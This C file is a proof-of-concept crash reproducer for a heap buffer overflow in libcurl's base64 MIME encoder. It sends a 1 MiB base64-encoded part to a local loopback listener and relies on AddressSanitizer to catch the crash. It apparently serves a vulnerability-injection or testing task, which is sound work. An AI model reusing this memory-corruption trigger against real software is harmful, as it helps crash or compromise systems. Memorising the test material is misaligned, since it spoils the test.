/* PoC: oversized base64-encoded curl_mime part drives a heap buffer overflow
 * in libcurl's base64 content encoder (lib/mime.c, encoder_base64_read).
 *
 * Uses only the public API (curl_mime_* + curl_easy_setopt/perform). A small
 * loopback TCP listener lets libcurl start sending the request body so the
 * encoder runs; no external network is required.
 *
 * Patched tree: ASan aborts (heap-buffer-overflow) while encoding the body.
 * Parent tree:  request proceeds normally, no abort.
 */
#include <curl/curl.h>

#include <pthread.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

static int server_fd = -1;
static unsigned short server_port = 0;

static void *server_thread(void *arg)
{
  (void)arg;
  int c = accept(server_fd, NULL, NULL);
  if(c >= 0) {
    char buf[65536];
    /* Drain the client so it keeps producing (encoding) body data. */
    while(recv(c, buf, sizeof(buf), 0) > 0)
      ;
    close(c);
  }
  return NULL;
}

static int start_server(void)
{
  struct sockaddr_in addr;
  socklen_t len = sizeof(addr);

  server_fd = socket(AF_INET, SOCK_STREAM, 0);
  if(server_fd < 0)
    return -1;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;
  if(bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    return -1;
  if(listen(server_fd, 1) < 0)
    return -1;
  if(getsockname(server_fd, (struct sockaddr *)&addr, &len) < 0)
    return -1;
  server_port = ntohs(addr.sin_port);
  return 0;
}

int main(void)
{
  CURL *easy;
  curl_mime *mime;
  curl_mimepart *part;
  pthread_t tid;
  char url[64];
  size_t datalen = 1024 * 1024;   /* > upload buffer (64 KiB) */
  char *data;

  if(curl_global_init(CURL_GLOBAL_ALL))
    return 1;
  if(start_server() < 0)
    return 1;
  pthread_create(&tid, NULL, server_thread, NULL);

  data = malloc(datalen);
  if(!data)
    return 1;
  memset(data, 'A', datalen);

  easy = curl_easy_init();
  mime = curl_mime_init(easy);
  part = curl_mime_addpart(mime);
  curl_mime_data(part, data, datalen);
  curl_mime_encoder(part, "base64");

  snprintf(url, sizeof(url), "http://127.0.0.1:%u/", server_port);
  curl_easy_setopt(easy, CURLOPT_URL, url);
  curl_easy_setopt(easy, CURLOPT_MIMEPOST, mime);
  curl_easy_setopt(easy, CURLOPT_TIMEOUT, 10L);

  curl_easy_perform(easy);

  curl_mime_free(mime);
  curl_easy_cleanup(easy);
  free(data);
  pthread_join(tid, NULL);
  curl_global_cleanup();
  return 0;
}
